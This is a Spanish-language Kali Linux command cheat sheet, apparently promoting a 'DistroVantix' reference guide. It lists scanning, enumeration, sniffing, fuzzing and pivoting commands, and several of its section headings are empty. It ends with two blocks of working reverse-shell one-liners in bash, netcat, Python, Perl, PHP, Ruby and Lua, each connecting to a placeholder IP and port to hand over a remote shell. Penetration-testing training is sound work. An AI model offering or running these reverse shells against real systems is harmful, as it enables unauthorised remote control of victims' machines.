KALI LINUX Y HERRAMIENTAS DE SEGURIDAD

Saber manejar las herramientas de tu entorno es fundamental para cualquier profesional de la seguridad. Sin embargo, memorizar tantos comandos o buscarlos individualmente puede ser un desafío. Por eso, en DistroVantix hemos preparado esta guía de referencia rápida que incluye: herramientas de reconocimiento, explotación, post-explotación, fuzzing, análisis forense, ingeniería inversa y reverse shells por lenguaje.

DistroVantix - Guía de Referencia Rápida (23 páginas)

Gestión de Red

ip a Muestra todas las interfaces y direcciones IP.

nmcli dev wifi Escanea redes WiFi cercanas desde terminal.

ifconfig [int] up/down Activa o desactiva una interfaz.

iwconfig Configuración específica de interfaces inalámbricas.

Mantenimiento

sudo apt update Sincroniza los repositorios de Kali.

sudo apt install [pkg] Instala nuevas herramientas de seguridad.

sudo apt full-upgrade Actualiza Kali a la última versión disponible.

systemctl start [serv] Inicia servicios (ej. postgresql o apache2).

Nmap - Escaneo

nmap -sS [objetivo] Escaneo TCP SYN (sigiloso).

nmap -sV [objetivo] Detecta versiones de servicios abiertos.

nmap -O [objetivo] Intenta identificar el Sistema Operativo.

nmap -p [puertos] Escanea puertos específicos (ej. -p 80,443).

Enumeración

whois [dominio] Información de registro de un dominio.

dig [dominio] Consultas detalladas a servidores DNS.

nslookup [IP] Resolución inversa de direcciones IP.

netdiscover -r [red] Descubrimiento pasivo de hosts en LAN.

Ataques WiFi

Cracking

Análisis y Sniffing

tshark Versión de terminal de Wireshark.

tcpdump -i [int] Captura tráfico de red en tiempo real.

Transferencia de Archivos

curl -O [URL] Descarga un archivo directamente desde una URL a la terminal.

Post-Explotación Básica

Web: Mapeo y Fuzzing

wfuzz -c -z file,[wordlist] [URL]/FUZZ Fuzzing avanzado de parámetros, rutas y subdominios.

whatweb [URL] Identifica tecnologías, CMS, servidores y versiones de un sitio.

wpscan --url [URL] Escáner de seguridad especializado en buscar fallos en WordPress.

OSINT y Recon

Pivoting y Túneles

proxychains [comando] Enruta cualquier herramienta (ej. nmap) a través de proxies SOCKS.

Evasión y Utilidades

stty raw -echo; fg Comandos para estabilizar la shell tras recibir una conexión.

nmap --script vuln [IP] Ejecuta scripts de vulnerabilidades conocidas contra el objetivo.

nmap -sU --top-ports 100 [IP] Escaneo de los puertos UDP más comunes.

Reverse Shells Linux

bash -i >& /dev/tcp/[IP]/[port] 0>&1 Bash reversa interactiva básica.

nc -e /bin/sh [IP] [port] Netcat con ejecución de shell reversa.

python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("[IP]",[port]));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/sh")' Python con spawn de TTY completo.

perl -e 'use Socket;$i="[IP]";$p=[port];socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i")}' Perl reversa sin dependencias.

Reverse Shells Web

php -r '$sock=fsockopen("[IP]",[port]);exec("/bin/sh -i <&3 >&3 2>&3");' PHP inversa clásica.

ruby -rsocket -e'f=TCPSocket.open("[IP]",[port]);while(cmd=f.gets);IO.popen(cmd,"r"){|io|f.write io.read}end' Ruby socket reversa.

lua -e "require('socket');require('os');t=socket.tcp();t:connect('[IP]','[port]');os.execute('/bin/sh -i <&3 >&3 2>&3');" Lua inversa ligera.

mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc [IP] [port] > /tmp/f Netcat con mkfifo (sin -e).
